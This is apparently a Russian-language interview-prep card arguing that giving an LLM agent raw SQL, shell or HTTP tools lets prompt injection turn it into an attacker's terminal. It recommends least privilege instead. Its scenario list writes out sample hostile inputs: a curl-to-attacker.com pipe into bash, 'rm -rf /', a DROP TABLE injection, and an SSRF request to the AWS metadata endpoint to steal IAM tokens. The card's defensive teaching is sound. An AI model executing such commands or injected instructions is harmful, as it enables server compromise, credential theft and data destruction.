# Why Arbitrary SQL/Shell/HTTP Tools Are Critical Flaws

Почему предоставление языковой модели инструментов с произвольным выполнением SQL, Shell-команд или произвольных HTTP-запросов является критической уязвимостью архитектуры?

---ANSWER---

### Короткий ответ
Произвольный SQL (executeSql(query)) или Shell (executeBash(cmd)) дает злоумышленнику через промпт-инъекцию возможность полного захвата сервера (RCE), кражи всей базы данных или участия в DDoS-атаках. Архитектура обязана следовать принципу наименьших привилегий (Least Privilege): только жестко параметризованные методы с фиксированной бизнес-семантикой.

### Подробное объяснение
Иногда в статьях предлагают 'супер-агента': дать модели доступ к bash или сырому SQL, чтобы она 'сама во всем разобралась'. В Enterprise-разработке это грубейшее нарушение безопасности (CWE-78, CWE-89).

### Сценарии катастрофы:
1. **Сырой SQL tool (executeSql(String sql))**:
   Инъекция вида: DROP TABLE users; -- или SELECT * FROM payment_cards приведет к мгновенной компрометации данных, обходя любые JPA-валидации.
2. **Shell tool (runCommand(String cmd))**:
   Инъекция: curl attacker.com/malware.sh | bash или rm -rf /. Модель становится удаленным терминалом хакера.
3. **Произвольный HTTP клиент (fetchUrl(String url))**:
   Приводит к SSRF (Server-Side Request Forgery). Модель заставят дернуть внутренний эндпоинт AWS Metadata: http://169.254.169.254/latest/meta-data/ и украсть IAM-токены сервера.

### Принцип наименьших привилегий (Least Privilege):
Вместо executeSql создаются специализированные методы:
- getTicketStatusById(Long ticketId)
- searchArticlesByKeyword(String keyword)

Каждый метод принимает строго типизированные примитивы, валидирует их и вызывает безопасный JPA/Spring Data репозиторий с параметризованными запросами.

### Уточняющий вопрос на интервью (Follow-up)
Как защититься от SSRF-уязвимости, если ассистенту все же необходимо скачивать веб-страницы по ссылкам пользователя?

### Распространённый неверный ответ (Pitfall)
Давать LLM универсальные инструменты 'на всякий случай' вместо проектирования гранулярных предметных сервисных методов.

### Key Points
- Никакого произвольного shell, raw SQL или нефильтрованного HTTP доступа для LLM.
- Используйте параметризованные бизнес-методы вместо универсальных исполнителей кода.
- Соблюдайте принцип наименьших привилегий: инструмент должен делать одну изолированную вещь.
- Защищайтесь от SSRF: блокируйте обращение к loopback (127.0.0.1) и приватным подсетям.

### Life Analogy
Если вам нужно починить выключатель, вы вызываете электрика с изолированной отверткой. Вы не отдаете незнакомцу ключи от главного рубильника всей электростанции города.
